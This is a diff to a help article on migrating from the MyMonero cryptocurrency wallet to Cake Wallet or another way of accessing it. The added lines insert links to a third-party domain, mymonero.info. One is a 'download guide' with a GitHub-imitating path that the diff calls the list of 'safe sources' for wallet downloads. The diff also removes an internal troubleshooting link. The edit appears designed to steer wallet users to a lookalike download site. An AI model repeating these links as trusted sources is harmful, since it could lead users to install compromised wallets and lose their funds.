@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 Before changing how you access MyMonero, identify your seed format, secure your backup, choose whether to restore or send funds, and plan for synchronization. Restoring the seed gives access to the same wallet; sweeping sends funds to a different wallet in a separate transaction.
 
+
+Prefer reading on the web? The [MyMonero migrate page](https://mymonero.info/migrate) on mymonero.info explains the same problem, the [Cake Wallet download page](https://mymonero.info/github/cake-developments) lists the safe sources, and [the MyMonero FAQ](https://mymonero.info/faq) covers the common questions.
+
 ## You'll see this if
 - You are moving from MyMonero desktop to Cake Wallet.
 - MyMonero hosted login is unavailable and you need another access plan.
@@ -54,7 +57,7 @@ MyMonero seeds can be 13 words (MyMonero-specific legacy format) or 25 words (st
 ## If that did not work
 If a seed is rejected, confirm its word count and that the restore flow supports that specific format. Check spelling and order using your offline record. Avoid guessing at missing words, testing on websites, or sharing a partial phrase. See [seed not accepted](./mymonero-seed-not-accepted.md).
 
-If the wallet restores but shows no balance, wait for the scan to finish, then check the restore height. A late height can miss earlier transactions; an earlier height takes longer. Follow [zero balance troubleshooting](./mymonero-balance-shows-zero.md). An error 523 is general guidance that a server connection is unavailable, not a diagnosis of the seed.
+If the wallet restores but shows no balance, wait for the scan to finish, then check the restore height. A late height can miss earlier transactions; an earlier height takes longer. Follow zero balance troubleshooting. An error 523 is general guidance that a server connection is unavailable, not a diagnosis of the seed.
 
 If you are unsure whether to restore or sweep, pause. Restoring is not a transfer; sweeping sends funds on-chain. Review the destination and fee only when ready. Historically MyMonero hosted servers charged a one-time fee to import a wallet created elsewhere; do not assume that this is a current fee.
 
@@ -90,6 +93,7 @@ No. Never share the phrase or private keys. Check your own backup privately.
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/cake-developments)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
